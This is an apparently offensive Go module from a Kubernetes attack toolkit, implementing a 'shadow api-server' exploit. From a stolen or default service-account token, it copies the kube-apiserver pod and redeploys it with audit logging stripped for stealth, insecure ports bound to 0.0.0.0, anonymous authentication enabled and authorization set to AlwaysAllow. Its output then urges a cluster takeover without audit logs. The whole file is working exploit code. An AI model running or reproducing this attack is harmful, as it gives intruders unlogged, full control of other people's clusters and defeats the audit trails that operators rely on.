package attack

import (
	"fmt"
	"log"
	"regexp"
	"strings"

	"github.com/KPT/conf"
	"github.com/KPT/gadget/errors"
	"github.com/KPT/gadget/kubectl"
	"github.com/tidwall/gjson"
	"github.com/tidwall/sjson"
)

func findApiServerPodInMasterNode(token string, serverAddr string) (string, error) {
	opts := kubectl.K8sRequestOption{
		TokenPath: "",
		Server:    serverAddr,
		Api:       "/api/v1/namespaces/kube-system/pods",
		Method:    "GET",
		PostData:  "",
		Anonymous: false,
	}

	switch token {
	case "default":
		opts.TokenPath = conf.K8sSATokenDefaultPath
	case "anonymous":
		opts.TokenPath = ""
		opts.Anonymous = true
	default:
		opts.TokenPath = token
	}

	log.Println("trying to find api-server pod in namespace:kube-system")
	resp, err := kubectl.ServerAccountRequest(opts)
	if err != nil {
		return "", errors.New("faild to request api-server.")
	}
	if !strings.Contains(resp, "selfLink") {
		log.Println("api-server response:")
		fmt.Println(resp)
		return "", errors.New("invalid to list pods, possible caused by api-server forbidden this request.")
	}
	// extract pod name
	pattern := regexp.MustCompile(`"/api/v1/namespaces/kube-system/pods/(kube-apiserver\b[^"]*?)"`)
	matched := pattern.FindAllStringSubmatch(resp, -1)
	if matched == nil {
		return "", errors.New("Cannot find kube-apiserver pod in namespace:kube-system, maybe target K8s master node managed by cloud provider, cannot deploy api-server in this environment.")
	}

	// match pod name in selfLink
	log.Println("find api-server pod:")
	for _, podName := range matched {
		fmt.Println(podName[1])
	}

	// only return one pod
	return matched[0][1], nil
}

func dumpPodConfig(token string, serverAddr string, podName string, namespace string) (string, error) {
	opts := kubectl.K8sRequestOption{
		TokenPath: "",
		Server:    serverAddr,
		Api:       fmt.Sprintf("/api/v1/namespaces/%s/pods/%s", namespace, podName),
		Method:    "GET",
		PostData:  "",
		Anonymous: false,
	}

	switch token {
	case "default":
		opts.TokenPath = conf.K8sSATokenDefaultPath
	case "anonymous":
		opts.TokenPath = ""
		opts.Anonymous = true
	default:
		opts.TokenPath = token
	}

	log.Println("dump config json of pod:", podName, "in namespace:", namespace)
	resp, err := kubectl.ServerAccountRequest(opts)
	if err != nil {
		return "", errors.New("faild to request api-server.")
	}
	if !strings.Contains(resp, "selfLink") {
		log.Println("api-server response:")
		fmt.Println(resp)
		return "", errors.New("invalid response data, possible caused by api-server forbidden this request.")
	}

	return resp, nil
}

func generateShadowApiServerConf(json string) string {

	json, _ = sjson.Delete(json, "status")
	json, _ = sjson.Delete(json, "metadata.selfLink")
	json, _ = sjson.Delete(json, "metadata.uid")
	json, _ = sjson.Delete(json, "metadata.annotations")
	json, _ = sjson.Delete(json, "metadata.resourceVersion")
	json, _ = sjson.Delete(json, "metadata.creationTimestamp")
	json, _ = sjson.Delete(json, "spec.tolerations")

	// patch cdxy 20210413
	// Invalid value: \"-shadow\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')","reason":"Invalid","details":{"name":"kube-apiserver-10.206.0.11-shadow","kind":"Pod","causes":[{"reason":"FieldValueInvalid","message":"Invalid value: \"-shadow\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')","field":"metadata.labels"}]},"code":422}
	json, _ = sjson.Set(json, "metadata.name", gjson.Get(json, "metadata.name").String()+"-shadow")
	json, _ = sjson.Set(json, "metadata.labels.component", gjson.Get(json, "metadata.labels.component").String()+"shadow")

	// remove audit logs to get stealth
	reg := regexp.MustCompile(`(")(--audit-log-[^"]*?)(")`)
	json = reg.ReplaceAllString(json, "${1}${3}")

	//argInsertReg := regexp.MustCompile(`(^[\s\S]*?"command"[\s\:]*?\[[^\]]*?"kube-apiserver")([^"]*?)(,\s*?"[\s\S]*?)$`)
	argInsertReg := regexp.MustCompile(`(^[\s\S]*?)("--etcd-keyfile=[^"]*?"[\s\S]*?)$`)

	// set --allow-privileged=true
	reg = regexp.MustCompile(`("--allow-privileged\s*?=\s*?)(.*?)(")`)
	json = reg.ReplaceAllString(json, "${1}true${3}")
	if !strings.Contains(json, "--allow-privileged") {
		json = argInsertReg.ReplaceAllString(json, `${1}"--allow-privileged=true",${2}`)
	}

	// set insecure-port to 0.0.0.0:9443
	reg = regexp.MustCompile(`("--insecure-port\s*?=\s*?)(.*?)(")`)
	json = reg.ReplaceAllString(json, "${1}9443${3}")
	if !strings.Contains(json, "--insecure-port") {
		json = argInsertReg.ReplaceAllString(json, `${1}"--insecure-port=9443",${2}`)
	}
	reg = regexp.MustCompile(`("--insecure-bind-address\s*?=\s*?)(.*?)(")`)
	json = reg.ReplaceAllString(json, "${1}0.0.0.0${3}")
	if !strings.Contains(json, "--insecure-bind-address") {
		json = argInsertReg.ReplaceAllString(json, `${1}"--insecure-bind-address=0.0.0.0",${2}`)
	}
	// set --secure-port to 9444
	reg = regexp.MustCompile(`("--secure-port\s*?=\s*?)(.*?)(")`)
	json = reg.ReplaceAllString(json, "${1}9444${3}")
	if !strings.Contains(json, "--secure-port") {
		json = argInsertReg.ReplaceAllString(json, `${1}"--secure-port=9444",${2}`)
	}

	// set anonymous-auth to true
	reg = regexp.MustCompile(`("--anonymous-auth\s*?=\s*?)(.*?)(")`)
	json = reg.ReplaceAllString(json, "${1}true${3}")
	if !strings.Contains(json, "--anonymous-auth") {
		json = argInsertReg.ReplaceAllString(json, `${1}"--anonymous-auth=true",${2}`)
	}

	// set authorization-mode=AlwaysAllow
	reg = regexp.MustCompile(`("--authorization-mode\s*?=\s*?)(.*?)(")`)
	json = reg.ReplaceAllString(json, "${1}AlwaysAllow${3}")
	if !strings.Contains(json, "--authorization-mode") {
		json = argInsertReg.ReplaceAllString(json, `${1}"--authorization-mode=AlwaysAllow",${2}`)
	}
	fmt.Println(json)
	return json
}

func deployPod(token string, serverAddr string, namespace string, data string) (string, error) {
	opts := kubectl.K8sRequestOption{
		TokenPath: "",
		Server:    serverAddr,
		Api:       fmt.Sprintf("/api/v1/namespaces/%s/pods", namespace),
		Method:    "POST",
		PostData:  data,
		Anonymous: false,
	}

	switch token {
	case "default":
		opts.TokenPath = conf.K8sSATokenDefaultPath
	case "anonymous":
		opts.TokenPath = ""
		opts.Anonymous = true
	default:
		opts.TokenPath = token
	}

	resp, err := kubectl.ServerAccountRequest(opts)
	if err != nil {
		return "", errors.New("faild to request api-server.")
	}
	if !strings.Contains(resp, "selfLink") {
		log.Println("api-server response:")
		fmt.Println(resp)
		return "", errors.New("invalid response data, possible caused by api-server forbidden this request.")
	}

	return resp, nil
}

// plugin interface
// type K8sShadowApiServerS struct{}

// func (p K8sShadowApiServerS) Desc() string {
// 	return "duplicate kube-apiserver pod, disable logs and grant all privilege to anonymous user. usage: kpt attack shadow [default|anonymous|<service-account-token-path>]"
// }
func K8sShadowApiServer(token string) bool {
	// args := cli.Args["<args>"].([]string)
	// if len(args) != 1 {
	// 	log.Println("invalid input args.")
	// 	log.Fatal("duplicate kube-apiserver pod, disable logs and grant all privilege to anonymous user. usage: kpt attack shadow [default|anonymous|<service-account-token-path>]")
	// }

	// get api-server connection conf in ENV
	log.Println("getting K8s api-server API addr.")
	addr, err := kubectl.ApiServerAddr()
	if err != nil {
		fmt.Println(err)
		return false
	}
	fmt.Println("\tFind K8s api-server in ENV:", addr)

	apiServerPod, err := findApiServerPodInMasterNode(token, addr)
	if err != nil {
		fmt.Println(err)
		return false
	}
	config, err := dumpPodConfig(token, addr, apiServerPod, "kube-system")
	if err != nil {
		fmt.Println(err)
		return false
	}
	// config for shadow api-server
	data := generateShadowApiServerConf(config)
	//fmt.Println("request data:",data)
	resp, err := deployPod(token, addr, "kube-system", data)
	//fmt.Println("response_data:",resp)
	if err != nil {
		log.Println(err)
		log.Println("exploit failed.")
		return false
	}

	if !strings.Contains(resp, "selfLink") {
		fmt.Println("response data:", resp)
		log.Println("exploit failed.")
		return false
	}

	log.Println("shadow api-server deploy success!")
	podName := gjson.Get(resp, "metadata.name").String()
	namespace := gjson.Get(resp, "metadata.namespace").String()
	node := gjson.Get(resp, "spec.nodeName").String()
	fmt.Printf("\tshadow api-server pod name:%s, namespace:%s, node name:%s\n", podName, namespace, node)
	fmt.Print("\tlistening insecure-port: 0.0.0.0:9443\n\tlistening secure-port: 0.0.0.0:9444")
	fmt.Print("\tenabled all privilege for system:anonymous user\n")
	fmt.Print("\tgo further run `kpt kcurl anonymous get http://your-node-intranet-ip:9443/api` to takeover cluster with none audit logs!\n")

	return true
}

// func init() {
// 	exploit := K8sShadowApiServerS{}
// 	plugin.RegisterExploit("k8s-shadow-apiserver", exploit)
// }
